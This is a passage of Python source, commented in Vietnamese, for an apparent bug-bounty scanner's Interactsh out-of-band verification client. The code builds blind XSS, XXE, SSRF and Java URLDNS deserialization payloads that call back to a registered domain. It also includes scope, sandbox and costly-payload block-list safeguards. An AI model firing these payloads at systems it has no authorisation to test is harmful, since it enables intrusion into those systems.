"""Interactsh OOB client (ticket #13, ADR-0004) — register per-Run → sinh
payload domains OOB → poll callback → gắn Evidence cho Candidate đang chờ
verify.

Worker tự nói giao thức interactsh với server public mặc định (oast.*):
POST /register (public key RSA + correlation-id + secret) → payload domain
`{correlation-id}{nonce}.{host}` xoay vòng THEO RUN (không tái sử dụng chéo)
→ GET /poll giải mã callback (RSA-OAEP-SHA256 + AES-CTR) → mỗi callback được
gắn Candidate qua token nhúng trong subdomain (`c<id>n<nonce>.<payload>`).
Registration + private key persist trong DB nên worker restart vẫn poll tiếp;
hết hạn TTL → deregister + status `expired`, callback cache cũ hơn retention
bị xoá — cache sống đủ lâu cho verify class blind kéo dài.

Phần thuần (token/domain, map callback → Candidate, chuẩn hoá interaction,
giải mã poll response, evidence writer) tách riêng để test; HTTP client và
pipeline nhận seam thay được (production: httpx + DB thật).
"""

import asyncio
import base64
import json
import logging
import random
import re
import secrets
import struct
import time
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import urlsplit

import asyncpg
import httpx
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from . import guardrails
from .config import settings
from .detect import CANDIDATE_COLS, cap_severity as detect_cap_severity
from .httpverify import build_http_probe_script
from .tools import add_log
from .verify import (
    BENIGN_PARAM_VALUE,
    ProbeCallable,
    ProbeProfile,
    ProbeBlocked,
    inject_param,
    parse_probe,
)

log = logging.getLogger("oob")

# bảng chữ cái DNS-safe của zbase32 (như client Go dùng cho nonce) — lowercase,
# không dấu chấm/gạch để token luôn là một DNS label hợp lệ
ZBASE32_ALPHABET = "ybndrfg8ejkmcpqxot1uwisza345h769"

# độ dài chuẩn của public interactsh server: correlation-id 20 + nonce 13
CORRELATION_ID_LENGTH = 20
NONCE_LENGTH = 13

# class Candidate mà vòng xác minh OOB hỗ trợ (blind — bằng chứng là callback,
# không phải response): ssrf (#13) + 3 lớp batch C (#17: blind XSS, XXE,
# deserialization)
OOB_VERIFY_CLASSES = ("ssrf", "xss", "xxe", "deserialization")

# class deserialization: payload CHỈ ping-back an toàn (không gadget thực thi)
# — Finding luôn kèm cờ "human review required" + severity trần thận trọng
# (chứng minh được deserialization xảy ra, KHÔNG chứng minh được impact)
DESERIALIZATION_SEVERITY_CAP = "medium"

# payload gây cost bị cấm theo Code of Conduct Intigriti (SMS/API tốn phí,
# tel:…): mẫu xuất hiện trong payload → guardrails HALT Run, không request
# nào đi ra. Dương tính giả hướng AN TOÀN (halt nhầm chỉ là phiền).
_COST_PAYLOAD_PATTERNS = (
    "sms:", "tel:", "twilio", "vonage", "nexmo", "plivo", "messagebird",
    "clickatell", "bulksms", "textmagic", "messaging.",
)

# callback về là bằng chứng trực tiếp — điểm cao hơn mọi tín hiệu response
SCORE_OOB_CALLBACK = 0.95


class InteractshError(RuntimeError):
    """Lỗi giao tiếp/giao thức interactsh — coi như lỗi môi trường (retry)."""


# ───────────────────────────── seam thuần (có test) ─────────────────────────────


def _dns_safe(length: int) -> str:
    return "".join(secrets.choice(ZBASE32_ALPHABET) for _ in range(length))


def new_correlation_id() -> str:
    """Correlation-id 20 ký tự DNS-safe (độ dài chuẩn của public server)."""
    return _dns_safe(CORRELATION_ID_LENGTH)


def new_nonce() -> str:
    """Nonce 13 ký tự — phần biến đổi của từng payload domain."""
    return _dns_safe(NONCE_LENGTH)


def new_secret_key() -> str:
    """Secret-key giữ kèm correlation-id khi poll (uuid4 như client Go)."""
    return str(uuid.uuid4())


def parse_servers(server_list: str) -> list[str]:
    """Danh sách host server từ cấu hình (phân tách phẩy, bỏ scheme) — thứ tự
    xoay ngẫu nhiên để không dồn vào một server."""
    hosts = [
        h.strip().replace("https://", "").replace("http://", "").strip("/")
        for h in (server_list or "").split(",")
    ]
    hosts = [h for h in hosts if h]
    random.shuffle(hosts)
    return hosts


def payload_domain(correlation_id: str, server_host: str, nonce: str) -> str:
    """Payload domain gốc của một registration: server nhận diện correlation
    theo prefix độ dài 20 của MỘT nhãn DNS — payload chuẩn của client Go là
    `{correlation-id}{nonce}.{host}`."""
    return f"{correlation_id}{nonce}.{server_host}"


# ── payload builder theo class (batch C #17) — thuần, nhúng token interactsh ──


def ssrf_payload(token: str, domain: str) -> str:
    """SSRF (#13): payload hệ thống — URL trỏ thẳng tới domain interactsh,
    target fetch server-side → callback."""
    return f"http://{token}.{domain}"


def blind_xss_payload(token: str, domain: str) -> str:
    """Blind XSS (#17): payload kiểu dalfox — tag script protocol-relative;
    khi payload được lưu/lọt vào trang mà admin render, trình duyệt fetch
    script → HTTP callback về interactsh."""
    return f'"><script src=//{token}.{domain}></script>'


def xxe_payload(token: str, domain: str) -> str:
    """XXE (#17): DOCTYPE khai báo external entity SYSTEM trỏ tới interactsh
    và tham chiếu ngay trong document — server parse XML → resolve entity →
    HTTP callback (không đọc file, không chứa bất kỳ URI nội bộ nào)."""
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE r [<!ENTITY v SYSTEM "http://{token}.{domain}/v">]>'
        "<r>&v;</r>"
    )


# ── deserialization: stream Java dạng gadget URLDNS — CHỈ ping-back DNS ──
# Gadget URLDNS (ysoserial): HashMap chứa java.net.URL — hashCode() của URL
# lúc readObject là MỘT phép phân giải tên miền, không có lệnh thực thi nào.
# Đây là payload ping-back an toàn duy nhất batch C dùng cho class này.

JAVA_STREAM_MAGIC = b"\xac\xed\x00\x05"
# serialVersionUID chuẩn của java.util.HashMap / java.net.URL (OpenJDK)
_JAVA_HASHMAP_SVUID = 362498820763181265       # 0x0507DAC1C31660D1
_JAVA_URL_SVUID = -2752461658742943918
TC_OBJECT, TC_CLASSDESC, TC_STRING = 0x73, 0x72, 0x74
TC_NULL, TC_ENDBLOCKDATA, TC_BLOCKDATA = 0x70, 0x78, 0x77
SC_SERIALIZABLE_WRITE_METHOD = 0x03  # SC_WRITE_METHOD | SC_SERIALIZABLE


def _j_utf(s: str) -> bytes:
    """Chuỗi giao thức Java serialization (modified UTF-8) — ASCII-only ở đây
    (tên class/trường/giá trị canary đều ASCII) nên length prefix là đủ."""
    b = s.encode("ascii")
    return len(b).to_bytes(2, "big") + b


def _j_classdesc(
    name: str, svuid: int, fields: list[tuple[str, str]]
) -> bytes:
    """TC_CLASSDESC: tên class + serialVersionUID + flags (serializable,
    có writeObject/readObject) + descriptor trường — primitive ('I'/'F')
    trước, object ('L' → Ljava/lang/String;) sau, đúng chuẩn JVM."""
    out = bytearray([TC_CLASSDESC])
    out += _j_utf(name)
    out += svuid.to_bytes(8, "big", signed=True)
    out.append(SC_SERIALIZABLE_WRITE_METHOD)
    out += len(fields).to_bytes(2, "big")
    for type_code, field_name in fields:
        out.append(ord(type_code))
        out += _j_utf(field_name)
        if type_code == "L":
            out.append(TC_STRING)
            out += _j_utf("Ljava/lang/String;")
    out.append(TC_ENDBLOCKDATA)  # hết descriptor trường
    out.append(TC_NULL)          # không superclass
    return bytes(out)


def _j_url_object(url: str) -> bytes:
    """TC_OBJECT java.net.URL — giá trị trường đúng thứ tự descriptor
    (primitive trước: port; object theo tên: authority, file, host,
    protocol, ref); handler = null (writeObject ghi tay cuối)."""
    parts = urlsplit(url)
    out = bytearray([TC_OBJECT])
    out += _j_classdesc(
        "java.net.URL", _JAVA_URL_SVUID,
        [("I", "port"), ("L", "authority"), ("L", "file"), ("L", "host"),
         ("L", "protocol"), ("L", "ref")],
    )
    out += struct.pack(">i", parts.port if parts.port else -1)
    for value in (parts.netloc, parts.path or "", parts.hostname or "",
                  parts.scheme, None):
        if value is None:
            out.append(TC_NULL)
        else:
            out.append(TC_STRING)
            out += _j_utf(value)
    out.append(TC_NULL)  # handler
    return bytes(out)


def java_urldns_stream(url: str) -> bytes:
    """Stream Java serialization hoàn chỉnh của payload URLDNS: HashMap
    (size 1) chứa java.net.URL làm key. readObject của HashMap gọi
    hashCode() trên key → java.net.URLAndHashCode → resolve DNS `url` —
    đúng MỘT ping-back, không class gadget thực thi nào trong stream."""
    out = bytearray(JAVA_STREAM_MAGIC)
    out.append(TC_OBJECT)
    out += _j_classdesc(
        "java.util.HashMap", _JAVA_HASHMAP_SVUID,
        [("F", "loadFactor"), ("I", "modCount"), ("I", "size"),
         ("I", "threshold")],
    )
    out += struct.pack(">f", 0.75)  # loadFactor
    out += struct.pack(">i", 0)     # modCount
    out += struct.pack(">i", 1)     # size
    out += struct.pack(">i", 16)    # threshold
    # writeObject của HashMap ghi thêm blockdata: capacity, size — rồi entries
    out.append(TC_BLOCKDATA)
    out.append(8)
    out += struct.pack(">i", 16) + struct.pack(">i", 1)
    out += _j_url_object(url)       # key — hashCode() → DNS lookup
    out.append(TC_STRING)
    out += _j_utf("v")              # value vô hại
    out.append(TC_ENDBLOCKDATA)
    return bytes(out)


def deserialization_payload(token: str, domain: str) -> str:
    """Insecure deserialization (#17): base64 của stream URLDNS — ping-back
    an toàn duy nhất: KHÔNG gadget thực thi (CommonsCollections, Templates-
    Impl…), KHÔNG JNDI/RMI. Callback chứng minh input được deserialize;
    impact phải do người dùng xác minh tay (Finding luôn kèm cờ)."""
    return base64.b64encode(java_urldns_stream(f"http://{token}.{domain}")).decode()


_OOB_PAYLOAD_BUILDERS = {
    "ssrf": ssrf_payload,
    "xss": blind_xss_payload,
    "xxe": xxe_payload,
    "deserialization": deserialization_payload,
}


def _require_oob_class(cls: str) -> str:
    """Class thuộc 4 lớp blind OOB — không thì ValueError (1 nguồn sự thật,
    dùng chung bởi oob_payload và vòng run_oob_verification)."""
    cls = str(cls or "").strip()
    if cls not in OOB_VERIFY_CLASSES:
        raise ValueError(
            f"class '{cls}' không thuộc lớp blind OOB: {', '.join(OOB_VERIFY_CLASSES)}"
        )
    return cls


def oob_payload(cls: str, token: str, domain: str) -> str:
    """Payload OOB của 1 class — class không hỗ trợ → ValueError."""
    return _OOB_PAYLOAD_BUILDERS[_require_oob_class(cls)](token, domain)


def find_costly_payload_pattern(payload: str) -> str | None:
    """Mẫu gây cost (SMS/API tốn phí — Code of Conduct Intigriti) đầu tiên
    xuất hiện trong payload; an toàn → None."""
    low = str(payload or "").lower()
    return next((p for p in _COST_PAYLOAD_PATTERNS if p in low), None)


def cap_deser_severity(severity: str) -> str:
    """Severity trần thận trọng cho deserialization — chỉ chứng minh được
    ping-back, không tự claim RCE (mặc định cap 'medium')."""
    return detect_cap_severity(severity, DESERIALIZATION_SEVERITY_CAP)


def candidate_token(candidate_id: int, nonce: str) -> str:
    """Token nhúng vào payload per-Candidate: `c<id>n<nonce>` — một DNS label,
    tách được candidate id khi callback quay về."""
    return f"c{int(candidate_id)}n{nonce}"


def extract_label(full_id: str) -> str:
    """Nhãn trái nhất của full-id interaction (vd `c42nxxx.abc...` → `c42nxxx`)
    — server ghi full-id gồm các nhãn trước domain gốc."""
    return (str(full_id or "").split(".") or [""])[0].strip().lower()


_TOKEN_RE = re.compile(rf"^c(\d+)n[{ZBASE32_ALPHABET}]{{{NONCE_LENGTH}}}$")


def candidate_id_from_token(label: str) -> int | None:
    """Candidate id từ nhãn payload; không khớp dạng token → None (callback
    trôi nổi — DNS rác, scanner khác — không gắn vào Candidate nào)."""
    m = _TOKEN_RE.match(str(label or ""))
    return int(m.group(1)) if m else None


def generate_rsa_keypair() -> tuple[str, str]:
    """(private PEM PKCS8, public base64) đúng định dạng /register của
    interactsh: public là PEM SubjectPublicKeyInfo mã hoá base64."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    private_pem = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ).decode()
    public_pem = key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return private_pem, base64.b64encode(public_pem).decode()


def decrypt_interactions(
    private_pem: str, aes_key_b64: str, items: list[str]
) -> list[dict]:
    """Giải mã poll response đúng cơ chế server: `aes_key` là AES-256 key bị
    mã hoá RSA-OAEP-SHA256 bằng public key đã register; từng item là
    base64(AES-CTR ciphertext) với IV 16 byte ở đầu."""
    try:
        key = serialization.load_pem_private_key(
            private_pem.encode(), password=None
        )
        aes_key = key.decrypt(
            base64.b64decode(aes_key_b64, validate=True),
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
    except Exception as exc:
        raise ValueError(f"giải mã aes_key thất bại: {exc}") from exc

    out: list[dict] = []
    for item in items:
        try:
            cipher = base64.b64decode(item, validate=True)
            if len(cipher) < 16:
                raise ValueError("ciphertext ngắn hơn IV")
            decryptor = Cipher(algorithms.AES(aes_key), modes.CTR(cipher[:16])).decryptor()
            plaintext = decryptor.update(cipher[16:]) + decryptor.finalize()
            out.append(json.loads(plaintext))
        except Exception as exc:
            raise ValueError(f"giải mã interaction thất bại: {exc}") from exc
    return out


_TS_FRACTION_RE = re.compile(r"\.(\d{1,6})\d*")


def _parse_ts(value) -> datetime | None:
    """Timestamp RFC3339Nano của interaction → datetime UTC; lạ/không có → None."""
    s = str(value or "").strip()
    if not s:
        return None
    if s.endswith("Z"):
        s = s[:-1] + "+00:00"
    s = _TS_FRACTION_RE.sub(r".\1", s)
    try:
        dt = datetime.fromisoformat(s)
    except ValueError:
        return None
    return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)


def parse_interaction(raw: dict) -> dict:
    """Chuẩn hoá 1 interaction thành bản ghi oob_callbacks: đúng 4 trường
    ticket yêu cầu (source, protocol, timestamp, raw interaction) + full-id
    để map về Candidate."""
    raw = raw or {}
    return {
        "protocol": str(raw.get("protocol") or ""),
        "source": str(raw.get("remote-address") or ""),
        "unique_id": str(raw.get("unique-id") or ""),
        "full_id": str(raw.get("full-id") or ""),
        "occurred_at": _parse_ts(raw.get("timestamp")),
        "raw_interaction": raw,
    }


def is_active(reg: dict, now: datetime) -> bool:
    """Registration còn dùng được: status `active` VÀ chưa quá hạn — callback
    cache sống theo TTL (đủ dài cho verify blind), hết hạn thì rõ ràng."""
    expires_at = reg.get("expires_at")
    if hasattr(expires_at, "tzinfo") and expires_at.tzinfo is None:
        expires_at = expires_at.replace(tzinfo=timezone.utc)
    return reg.get("status") == "active" and expires_at is not None and expires_at > now


def _json_safe(obj):
    """Chuẩn hoá bản ghi evidence thành JSON-safe (datetime → ISO 8601)."""
    if isinstance(obj, datetime):
        return obj.isoformat()
    if isinstance(obj, dict):
        return {k: _json_safe(v) for k, v in obj.items()}
    if isinstance(obj, (list, tuple)):
        return [_json_safe(v) for v in obj]
    return obj


def write_oob_evidence(run_id: int, candidate_id: int, record: dict) -> str | None:
    """Ghi evidence OOB (source, protocol, timestamp, raw interaction) ra
    volume; path ghi vào candidates.oob_evidence_path. IO lỗi → None."""
    try:
        base = Path(settings.evidence_dir) / str(run_id) / "oob"
        base.mkdir(parents=True, exist_ok=True)
        path = base / f"{candidate_id:03d}.json"
        path.write_text(
            json.dumps(_json_safe(record), ensure_ascii=False), encoding="utf-8"
        )
        return str(path)
    except OSError as exc:
        log.warning("run %d: không ghi được oob evidence (%s)", run_id, exc)
        return None


# ───────────────────────────── HTTP client (giao thức interactsh) ─────────────────────────────


class InteractshClient:
    """Client HTTP tối giản đúng giao thức interactsh — seam thay được trong
    test (production: httpx). https lỗi → fallback http (như client Go)."""

    def __init__(self, timeout: float = 15.0):
        self._http = httpx.AsyncClient(timeout=timeout)

    async def register(
        self, host: str, public_key_b64: str, secret_key: str, correlation_id: str
    ) -> str:
        """Đăng ký correlation-id + public key; trả server_url đã dùng."""
        payload = {
            "public-key": public_key_b64,
            "secret-key": secret_key,
            "correlation-id": correlation_id,
        }
        last: Exception | None = None
        for scheme in ("https", "http"):
            url = f"{scheme}://{host}"
            try:
                res = await self._http.post(f"{url}/register", json=payload)
            except httpx.HTTPError as exc:
                last = InteractshError(f"{url}: {exc}")
                continue
            if res.status_code == 200:
                message = str((res.json() or {}).get("message") or "")
                if message == "registration successful":
                    return url
                last = InteractshError(f"{url}: {message or 'register bị từ chối'}")
            else:
                last = InteractshError(f"{url}: HTTP {res.status_code} {res.text[:200]}")
        raise last or InteractshError(f"register thất bại trên {host}")

    async def poll(
        self, server_url: str, correlation_id: str, secret_key: str
    ) -> tuple[list[str], str]:
        """Lấy (data, aes_key) từ /poll — server trả callback đã mã hoá."""
        res = await self._http.get(
            f"{server_url}/poll",
            params={"id": correlation_id, "secret": secret_key},
        )
        if res.status_code != 200:
            raise InteractshError(
                f"poll {server_url}: HTTP {res.status_code} {res.text[:200]}"
            )
        body = res.json() or {}
        return list(body.get("data") or []), str(body.get("aes_key") or "")

    async def deregister(self, server_url: str, correlation_id: str, secret_key: str) -> bool:
        """Huỷ đăng ký (hết hạn sạch sẽ) — False nếu server từ chối."""
        res = await self._http.post(
            f"{server_url}/deregister",
            json={"correlation-id": correlation_id, "secret-key": secret_key},
        )
        return res.status_code == 200

    async def aclose(self) -> None:
        await self._http.aclose()


# ───────────────────────────── manager (DB + poll) ─────────────────────────────

_REG_COLS = (
    "id, run_id, server_url, domain, correlation_id, secret_key, private_key, "
    "status, registered_at, expires_at"
)

_INSERT_REG_SQL = f"""
INSERT INTO oob_registrations (run_id, server_url, domain, correlation_id,
                               secret_key, private_key, expires_at)
VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING {_REG_COLS}
"""

_INSERT_CALLBACK_SQL = """
INSERT INTO oob_callbacks (registration_id, run_id, candidate_id, protocol,
                           source, unique_id, full_id, occurred_at,
                           raw_interaction)
VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9::jsonb) RETURNING id
"""

# count đếm TRỰC TIẾP từ bảng callbacks (idempotent khi evidence ghi lại nhiều
# lần), path evidence giữ lần đầu
_ATTACH_EVIDENCE_SQL = """
UPDATE candidates SET
    oob_evidence_path = COALESCE(oob_evidence_path, $2),
    oob_callback_count = (SELECT count(*) FROM oob_callbacks
                          WHERE candidate_id = candidates.id)
WHERE id = $1
"""


def _parse_raw_interaction(item) -> dict:
    """raw_interaction từ DB (asyncpg trả jsonb dưới dạng str) → dict; đứt
    JSON thì giữ nguyên để không mất bằng chứng."""
    if isinstance(item, str):
        try:
            return json.loads(item)
        except ValueError:
            return item  # type: ignore[return-value]
    return item or {}


async def _deregister_and_mark(
    pool: asyncpg.Pool,
    regs: list[dict],
    status: str,
    client: InteractshClient | None = None,
) -> None:
    """Deregister một loạt registration khỏi server (best-effort — server
    chết không chặn việc đánh dấu) rồi chuyển status (closed/expired) — hết
    hạn sạch sẽ, không poll domain mồ côi."""
    if not regs:
        return
    own_client = client is None
    client = client or InteractshClient()
    try:
        for reg in regs:
            try:
                await client.deregister(
                    reg["server_url"], reg["correlation_id"], reg["secret_key"]
                )
            except InteractshError as exc:
                log.warning("deregister registration %d lỗi (bỏ qua): %s", reg["id"], exc)
    finally:
        if own_client:
            await client.aclose()
    async with pool.acquire() as conn:
        await conn.execute(
            "UPDATE oob_registrations SET status = $2, "
            "closed_at = CASE WHEN $2 = 'closed' THEN now() ELSE closed_at END "
            "WHERE id = ANY($1)",
            [r["id"] for r in regs],
            status,
        )


async def ensure_registration(
    pool: asyncpg.Pool, run_id: int, client: InteractshClient | None = None
) -> dict:
    """Registration `active` chưa hết hạn của Run — có thì dùng lại (poll tiếp
    session cũ), không thì register MỚI (domain xoay vòng per Run/per lần hết
    hạn; không bao giờ tái sử dụng domain giữa hai Run)."""
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            f"SELECT {_REG_COLS} FROM oob_registrations "
            "WHERE run_id = $1 AND status = 'active' AND expires_at > now() "
            "ORDER BY id DESC LIMIT 1",
            run_id,
        )
    if row is not None:
        return dict(row)
    return await _register_run(pool, run_id, client)


async def _register_run(
    pool: asyncpg.Pool, run_id: int, client: InteractshClient | None = None
) -> dict:
    own_client = client is None
    client = client or InteractshClient()
    try:
        servers = parse_servers(settings.interactsh_server)
        if not servers:
            raise InteractshError("INTERACTSH_SERVER rỗng — không có server nào")
        private_pem, public_b64 = generate_rsa_keypair()
        correlation_id, secret_key = new_correlation_id(), new_secret_key()
        errors: list[str] = []
        server_url = None
        for host in servers:
            try:
                server_url = await client.register(host, public_b64, secret_key, correlation_id)
                break
            except InteractshError as exc:
                errors.append(str(exc))
        if server_url is None:
            raise InteractshError(
                "register interactsh thất bại trên mọi server: " + " · ".join(errors)
            )
        domain = payload_domain(correlation_id, urlsplit(server_url).hostname, new_nonce())
        expires_at = datetime.now(timezone.utc) + timedelta(
            hours=settings.oob_registration_ttl_h
        )
        async with pool.acquire() as conn:
            row = await conn.fetchrow(
                _INSERT_REG_SQL, run_id, server_url, domain, correlation_id,
                secret_key, private_pem, expires_at,
            )
    finally:
        if own_client:
            await client.aclose()
    reg = dict(row)
    await add_log(
        pool, run_id,
        f"OOB: register interactsh thành công ({server_url}) — payload domain "
        f"riêng cho Run này: *.{domain} (hết hạn {expires_at:%d/%m %H:%M} UTC)",
    )
    return reg


async def close_run_registrations(
    pool: asyncpg.Pool, run_id: int, client: InteractshClient | None = None
) -> int:
    """Đóng mọi registration `active` của Run (Run kết quả xong): deregister
    khỏi server (best-effort) + status `closed` — hết hạn sạch sẽ."""
    async with pool.acquire() as conn:
        rows = [
            dict(r)
            for r in await conn.fetch(
                f"SELECT {_REG_COLS} FROM oob_registrations "
                "WHERE run_id = $1 AND status = 'active'",
                run_id,
            )
        ]
    await _deregister_and_mark(pool, rows, "closed", client)
    return len(rows)


async def poll_registration(
    pool: asyncpg.Pool, reg: dict, client: InteractshClient | None = None
) -> dict:
    """Poll MỘT registration: giải mã interaction → lưu oob_callbacks → map
    token payload về Candidate CÙNG Run → gắn Evidence (ghi lại file + count).
    Trả {"stored": n, "matched": [bản ghi callback đã gắn]}."""
    own_client = client is None
    client = client or InteractshClient()
    try:
        data, aes_key = await client.poll(
            reg["server_url"], reg["correlation_id"], reg["secret_key"]
        )
    finally:
        if own_client:
            await client.aclose()
    if not data:
        return {"stored": 0, "matched": []}
    interactions = decrypt_interactions(reg["private_key"], aes_key, data)

    stored = 0
    matched: list[dict] = []
    by_candidate: dict[int, dict] = {}
    async with pool.acquire() as conn:
        for raw in interactions:
            rec = parse_interaction(raw)
            candidate_id = None
            cand = None
            token_id = candidate_id_from_token(extract_label(rec["full_id"]))
            if token_id is not None:
                cand = await conn.fetchrow(
                    "SELECT id, run_id, class, target FROM candidates WHERE id = $1",
                    token_id,
                )
                # run isolation: token của Run khác KHÔNG gắn chéo
                if cand is not None and cand["run_id"] == reg["run_id"]:
                    candidate_id = token_id
            callback_id = await conn.fetchval(
                _INSERT_CALLBACK_SQL, reg["id"], reg["run_id"], candidate_id,
                rec["protocol"], rec["source"], rec["unique_id"], rec["full_id"],
                rec["occurred_at"], json.dumps(rec["raw_interaction"], ensure_ascii=False),
            )
            stored += 1
            if candidate_id is not None:
                record = {**rec, "id": callback_id, "candidate_id": candidate_id}
                matched.append(record)
                by_candidate.setdefault(
                    candidate_id,
                    {"first": record, "class": cand["class"], "target": cand["target"]},
                )
        # gắn Evidence cho từng Candidate có callback mới (đều là Candidate
        # đang chờ verify — token chỉ sinh trong vòng xác minh OOB)
        for candidate_id, info in by_candidate.items():
            callbacks = [
                dict(r)
                for r in await conn.fetch(
                    "SELECT id, protocol, source, unique_id, full_id, occurred_at, "
                    "received_at, raw_interaction FROM oob_callbacks "
                    "WHERE candidate_id = $1 ORDER BY id",
                    candidate_id,
                )
            ]
            for c in callbacks:
                c["raw_interaction"] = _parse_raw_interaction(c.get("raw_interaction"))
            path = write_oob_evidence(reg["run_id"], candidate_id, {
                "schema": "vulhunt.oob-evidence/1",
                "candidate_id": candidate_id,
                "run_id": reg["run_id"],
                "class": info["class"],
                "target": info["target"],
                "registration": {
                    "id": reg["id"],
                    "server_url": reg["server_url"],
                    "domain": reg["domain"],
                    "correlation_id": reg["correlation_id"],
                },
                "callbacks": callbacks,
            })
            await conn.execute(_ATTACH_EVIDENCE_SQL, candidate_id, path)
    if matched:
        await add_log(
            pool, reg["run_id"],
            f"OOB: {len(matched)} callback gắn vào Candidate "
            f"#{', #'.join(str(m['candidate_id']) for m in matched)}"
            + (f" (tổng {stored} interaction)" if stored != len(matched) else ""),
        )
    return {"stored": stored, "matched": matched}


async def poll_once(pool: asyncpg.Pool, client: InteractshClient | None = None) -> dict:
    """Một vòng poll nền: poll mọi registration active, hết hạn quá TTL →
    deregister + `expired`, callback cũ hơn retention → xoá khỏi cache."""
    now = datetime.now(timezone.utc)
    async with pool.acquire() as conn:
        regs = [
            dict(r)
            for r in await conn.fetch(
                f"SELECT {_REG_COLS} FROM oob_registrations "
                "WHERE status = 'active' ORDER BY id LIMIT 100"
            )
        ]
    totals = {"polled": 0, "callbacks": 0, "matched": 0, "expired": 0}
    for reg in regs:
        if not is_active(reg, now):
            continue
        try:
            summary = await poll_registration(pool, reg, client)
        except InteractshError as exc:
            log.warning("poll registration %d lỗi (bỏ qua vòng này): %s", reg["id"], exc)
            continue
        totals["polled"] += 1
        totals["callbacks"] += summary["stored"]
        totals["matched"] += len(summary["matched"])

    # hết hạn sạch sẽ: deregister khỏi server, đánh dấu `expired`
    async with pool.acquire() as conn:
        expired = [
            dict(r)
            for r in await conn.fetch(
                f"SELECT {_REG_COLS} FROM oob_registrations "
                "WHERE status = 'active' AND expires_at <= now()"
            )
        ]
    await _deregister_and_mark(pool, expired, "expired", client)
    totals["expired"] = len(expired)

    # callback cache: giữ đủ lâu cho verify dài, cũ hơn retention thì xoá
    async with pool.acquire() as conn:
        await conn.execute(
            "DELETE FROM oob_callbacks WHERE received_at < now() - make_interval(hours => $1)",
            settings.oob_callback_retention_h,
        )
    return totals


async def poll_forever(pool: asyncpg.Pool, interval: float | None = None) -> None:
    """Vòng lặp nền của worker (main.py lifespan): poll định kỳ để callback
    từ Internet gắn vào Candidate `verifying` đúng lúc, kể cả khi không ai
    đang chạy vòng verify nào."""
    interval = float(interval or settings.oob_poll_interval_s)
    while True:
        try:
            await poll_once(pool)
        except asyncio.CancelledError:
            raise
        except Exception:
            log.exception("vòng poll OOB lỗi — thử lại sau %.0fs", interval)
        await asyncio.sleep(interval)


async def list_for_candidate(pool: asyncpg.Pool, candidate_id: int) -> dict | None:
    """Callback count + chi tiết cho UI Candidate: registration hiện hành của
    Run (domain riêng per Run) + danh sách callback (mới nhất trước)."""
    async with pool.acquire() as conn:
        cand = await conn.fetchrow(
            "SELECT id, run_id FROM candidates WHERE id = $1", candidate_id
        )
        if cand is None:
            return None
        reg = await conn.fetchrow(
            "SELECT id, server_url, domain, correlation_id, status, "
            "registered_at, expires_at FROM oob_registrations "
            "WHERE run_id = $1 AND status = 'active' ORDER BY id DESC LIMIT 1",
            cand["run_id"],
        )
        rows = await conn.fetch(
            "SELECT id, candidate_id, protocol, source, unique_id, full_id, "
            "occurred_at, received_at, raw_interaction FROM oob_callbacks "
            "WHERE candidate_id = $1 ORDER BY id DESC LIMIT 200",
            candidate_id,
        )
    callbacks = []
    for r in rows:
        item = dict(r)
        item["raw_interaction"] = _parse_raw_interaction(item.get("raw_interaction"))
        callbacks.append(item)
    return {
        "registration": dict(reg) if reg else None,
        "callbacks": callbacks,
        "count": len(callbacks),
    }


# ───────────────────────────── vòng xác minh OOB (blind class) ─────────────────────────────


# severity $7: chỉ deserialization verified được ép trần (batch C #17) —
# NULL thì giữ nguyên
_OOB_VERDICT_SQL = f"""
UPDATE candidates SET status = $2, confidence = $3, confidence_threshold = $4,
    reject_reason = $5, oob_evidence_path = $6, severity = COALESCE($7, severity)
WHERE id = $1 RETURNING {CANDIDATE_COLS}
"""


async def run_oob_verification(
    pool: asyncpg.Pool,
    candidate: dict,
    probe: ProbeCallable | None = None,
    client: InteractshClient | None = None,
    wait_s: float | None = None,
    poll_s: float | None = None,
    threshold: float | None = None,
) -> dict:
    """Trọn vòng xác minh OOB cho Candidate blind (4 lớp batch C #17: ssrf,
    blind XSS, XXE, deserialization): ensure registration per-Run → payload
    theo class (oob_payload) chèn vào param → baseline + PoC chạy TRONG
    sandbox (như mọi payload) → chờ/poll callback trong cửa sổ `wait_s` →
    callback về = bằng chứng blind khái quát → verified kèm evidence OOB;
    hết cửa sổ không callback → rejected kèm lý do.

    Deserialization: payload CHỈ ping-back an toàn (URLDNS) — Finding luôn
    kèm cờ human review + severity ép trần. Payload gây cost (SMS/API tốn
    phí — Code of Conduct Intigriti) → guardrails HALT Run TRƯỚC khi request
    nào đi ra.

    `probe(script, target)` là seam thực thi (mặc định sandbox); `client` là
    seam interactsh. Contract lỗi giống verify redirect: target bị chặn scope
    → ProbeBlocked (trả lifecycle về cũ); class không hỗ trợ → ValueError;
    lỗi môi trường → RuntimeError.
    """
    candidate_id = candidate["id"]
    run_id = candidate["run_id"]
    cls = _require_oob_class(candidate.get("class"))
    human_review = cls == "deserialization"
    threshold = float(
        settings.verify_confidence_threshold if threshold is None else threshold
    )
    wait_s = float(settings.oob_verify_wait_s if wait_s is None else wait_s)
    poll_s = float(settings.oob_verify_poll_s if poll_s is None else poll_s)
    param = (candidate.get("param") or "").split(",")[0].strip()
    prev_status = candidate.get("status") or "new"

    async def _update(sql: str, *params) -> dict | None:
        async with pool.acquire() as conn:
            row = await conn.fetchrow(sql, *params)
        return dict(row) if row else None

    def _summary(verdict, score, reason, signals, patterns, payload, token,
                 reg, callbacks, evidence, base_sid, poc_sid) -> dict:
        return {
            "candidate_id": candidate_id,
            "run_id": run_id,
            "class": cls,
            "verdict": verdict,
            "score": round(float(score), 4),
            "threshold": threshold,
            "reason": reason,
            "signals": signals,
            "patterns": patterns,
            "payload": payload,
            "token": token,
            "domain": reg["domain"] if reg else None,
            "callbacks": callbacks,
